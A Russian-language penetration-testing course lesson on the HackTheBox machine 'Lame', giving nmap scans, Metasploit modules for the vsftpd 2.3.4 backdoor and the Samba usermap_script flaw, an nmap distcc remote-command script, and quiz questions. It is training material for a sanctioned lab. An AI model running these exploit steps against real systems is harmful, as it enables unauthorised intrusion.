# Занятие 52. HackTheBox (Easy): первая машина уровня Easy (Lame)

## Теория

После Starting Point переходим к реальным машинам уровня **Easy**. Это первый шаг к самостоятельному пентесту без подсказок.

**Машина Lame** — классика HTB, работает на Linux (Ubuntu). Уязвимости:
- **vsftpd 2.3.4** — бэкдор в FTP-сервере
- **Samba** — уязвимость в реализации SMB
- **distcc** — удаленное выполнение кода

**Методология пентеста (PTES):**
1. **Information Gathering** — сбор информации
2. **Vulnerability Analysis** — анализ уязвимостей
3. **Exploitation** — эксплуатация
4. **Post-Exploitation** — закрепление, повышение привилегий

**Формат флагов HTB:**
- `user.txt` — флаг пользователя (в домашней директории)
- `root.txt` — флаг root (в /root/)

## Практическое занятие

### Машина: Lame

**Шаг 1. Сканирование портов**
```bash
nmap -p- -T4 <target_ip>
nmap -sV -sC -p 21,22,139,445,3632 <target_ip>
```

Открытые порты:
- 21/tcp  — ftp (vsftpd 2.3.4)
- 22/tcp  — ssh
- 139/tcp — netbios-ssn (Samba)
- 445/tcp — netbios-ssn (Samba)
- 3632/tcp — distccd

**Шаг 2. Проверка FTP (vsftpd 2.3.4)**
Эта версия содержит известный бэкдор. Проверяем через Metasploit:
```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target_ip>
exploit
```

**Шаг 3. Если бэкдор не сработал — проверяем Samba**
```bash
search samba
use exploit/multi/samba/usermap_script
set RHOSTS <target_ip>
set TARGET 0
exploit
```

**Шаг 4. Получение флагов**
```bash
cat /home/<user>/user.txt
cat /root/root.txt
```

**Шаг 5. Альтернативный путь через distcc**
```bash
nmap --script distcc-exec --script-args="distcc-exec.cmd='id'" -p 3632 <target_ip>
```


## Примеры вывода

Пример вывода команд будет добавлен индивидуально для каждого урока.



## Частые ошибки

1. **Бэкдор vsftpd 2.3.4 не срабатывает**: Эта уязвимость часто не работает на современных машинах HTB. Если бэкдор не откликается, переходите к эксплуатации Samba (usermap_script).
2. **Неправильный выбор Target в Metasploit**: В эксплойте `ms17_010_eternalblue` нужно выбрать правильный Target (для Windows 7 обычно Target 0 или 2). Неверный Target приводит к BSOD цели.
3. **Игнорирование `distcc`**: Порт 3632 часто пропускают, думая что это безопасный сервис. Но `distccd` позволяет удаленное выполнение кода без аутентификации.



## Вопросы на понимание

1. Почему машина Lame считается классикой HackTheBox и входит в список "Easy"?
   <details><summary>Ответ</summary>На ней есть сразу несколько векторов атаки (vsftpd, Samba, distcc), что делает её идеальной для обучения разным типам эксплуатации.</details>
2. В чем разница между `user.txt` и `root.txt` в машинах HTB?
   <details><summary>Ответ</summary>`user.txt` флаг находится в домашней директории обычного пользователя (доступ на чтение), `root.txt` — в /root/ (требует повышения привилегий до root).</details>
3. Зачем нужна методология PTES при атаке на конкретную машину?
   <details><summary>Ответ</summary>PTES (Penetration Testing Execution Standard) дает структуру: разведка → анализ уязвимостей → эксплуатация → post-exploitation. Это предотвращает хаотичный поиск и упрощает отчет.</details>



## Форматы флагов

- **TryHackMe**: `THM{...}`
- **HackTheBox**: `HTB{...}`
- **PortSwigger**: "Lab solved!" (без флагов)



## Адаптация под macOS (M2, 8GB)

- Для VPN используйте **Tunnelblick** (бесплатный OpenVPN клиент для macOS): скачайте .ovpn файл и откройте через Tunnelblick
- Виртуалки: используйте **UTM** (бесплатно для M2) или **Parallels** вместо VirtualBox
- "На 8GB RAM выделяйте VM не более 3-4GB"
- Docker работает нативно на M2: `docker pull <image>`
- Для установки инструментов используйте Homebrew: `brew install <tool>`
- Если требуется Python: `pip3 install <package>`


## Задачи для самостоятельного выполнения

1. **Машина "Legacy"** (Easy) — Windows XP, MS08-067 (аналог EternalBlue для старых систем)
2. **Машина "Nibbles"** (Easy) — веб-уязвимость в Nibbleblog CMS
3. **Машина "Shocker"** (Easy) — Shellshock (CVE-2014-6271), уязвимость bash

> **Важно:** Записывайте каждый шаг в отчет. Это пригодится для сертификации eJPT и OSCP.
